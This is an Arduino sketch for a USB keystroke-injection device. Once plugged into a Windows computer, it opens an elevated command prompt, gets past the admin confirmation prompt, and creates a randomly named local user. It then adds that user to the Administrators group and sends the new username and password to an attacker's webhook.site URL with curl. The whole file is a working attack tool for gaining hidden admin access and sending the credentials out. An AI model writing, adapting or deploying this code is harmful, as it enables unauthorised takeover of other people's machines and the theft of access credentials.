#include <Keyboard.h>

//This script will create an admin user

void setup() {
  
  String letters[36] = {"a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l",
                        "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x",
                        "y", "z", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0"};
  
  Keyboard.begin();
  
  //This block is made just to launch "win+r" sometimes, 
  //the system ignores the first try, so I just do it twice
  Keyboard.write(0xB0);
  Keyboard.releaseAll();
  delay(300);
  Keyboard.write(KEY_ESC);
  Keyboard.press(KEY_RIGHT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(300);
  Keyboard.write(KEY_ESC);
  Keyboard.press(KEY_RIGHT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(300);

  //Launch small cmd
  //Keyboard.println("cmd /k mode con: cols=50 lines=1");
  Keyboard.println("cmd");
  delay(300);
  
  //If we want to run cmd as admin, we need to execute cmd with ctrl+shift+enter
   
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(0xB0);
  Keyboard.releaseAll();
  delay(1000);
    
  //The confirmation screen will pop up, so wee will press left and enter
   
  Keyboard.write(KEY_LEFT_ARROW);
  delay(300);
  Keyboard.write(0xB0);
  delay(300);


  //We are going to create now a random userName and Pass

  String userName = "";
  String pass = "";
  for(int i = 0; i < 10; i++)
  {
   userName += letters[random(0, 36)];
   pass += letters[random(0,36)];
  }

  
  //Open Powershell:
  Keyboard.println("powershell");
  Keyboard.write(0xB0);
  delay(300);

  //Lets create an user:
  Keyboard.println("net user /add "+ userName +" "+ pass);//TODO random generate user and pass
  Keyboard.write(0xB0);
  delay(1000);

  //We need to extract the administrators group name and store it:
  Keyboard.println("$Group = Get-WmiObject -Query \"Select * From Win32_Group Where LocalAccount = TRUE And SID = 'S-1-5-32-544'\"");
  Keyboard.write(0xB0);
  delay(100);
  Keyboard.println("$gName = $Group.Name");
  Keyboard.write(0xB0);
  delay(300);
  
  //Add him to admin group
  Keyboard.println("net localgroup $gName "+ userName +" /add");
  Keyboard.write(0xB0);
  delay(300);

  //Now we will send the credentials to our webhook
  Keyboard.println("curl https://webhook.site/[YOUR_ID]?user="+ userName +"\"&\"Pass="+ pass);
  Keyboard.write(0xB0);

  //Close the window
  //Keyboard.write("exit");
}

void loop() {

}
